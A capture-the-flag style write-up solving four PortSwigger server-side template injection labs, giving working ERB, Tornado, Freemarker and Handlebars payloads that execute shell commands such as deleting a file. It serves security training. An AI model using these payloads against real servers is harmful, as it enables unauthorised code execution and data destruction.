## Basic SSTI
[Basic SSTI](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

Write-up:

1. When we click the first product, we see the message "Unfortunately this product is out of stock."
If we change the message parameter to `<%= 7*7 %>`, we see that it returns 49 - ERB injection possibility.

2. Changing the message parameter to `<%= system 'ls' %>` shows us the **morale.txt** file.
   
3. We can use `<%= system 'rm morale.txt' %>` to solve the lab.

## Basic SSTI (code context)
[Basic SSTI (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

Write-up:

1. After logging in, we see there are two actions in our account - changing e-mail and preferred name.
Analyzing both these requests shows us that changing preferred name has an interesting parameter that changes our name display in post comments. For example, changing preferred name to name uses parameter `blog-post-author-display=user.name`.

2. After studying the Tornado docs, we see that its template expressions are surrounded by curly braces, so we can use these to escape and execute code: <br>
    `blog-post-author-display=user.name}}{{7*7}}` <br>
    This shows us 49, which points to code being executed.

3. Using {% %} to execute arbitrary code, we can craft the following payload: <br>
    `blog-post-author-display=user.name}}{%25%20import%20os%20%25}{{os.system('rm%20/home/carlos/morale.txt')}}` <br>
    URL-encoding the necessary characters (spaces - %20 and % - %25). This solves the lab.

## SSTI using documentation
[SSTI using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

Write-up:

1. We are instructed to discover the template engine used. If we click one of the posts, we have
the option to edit a template, we can see that code is being executed to retrieve stock, for example.

2. Using this [tool](https://cheatsheet.hackmanit.de/template-injection-table/), 
we discover that this lab uses a Freemarker template.

3. Using the [documentation](https://freemarker.apache.org/docs/api/index.html), we craft the following payload: <br> `${"freemarker.template.utility.Execute"?new()("rm morale.txt")}` <br> This solves the lab.

## SSTI in an unknown language with a documented exploit
[SSTI in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

Write-up:

1. Like in the **Basic SSTI** lab, we can change a message parameter. Using this
[tool](https://cheatsheet.hackmanit.de/template-injection-table/), we discover 
this lab is using a Handlebars template (Javascript).

2. Searching the internet for documented Handlebars SSTI exploits, we find this
[link](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2).

3. Using the Node.js [docs](https://nodejs.org/api/child_process.html) for child_process,
we can craft the following payload: <br>
    ```
    {{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');" }}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}
    ```

4. URL-encoding this payload and submitting it as **message** solves the lab.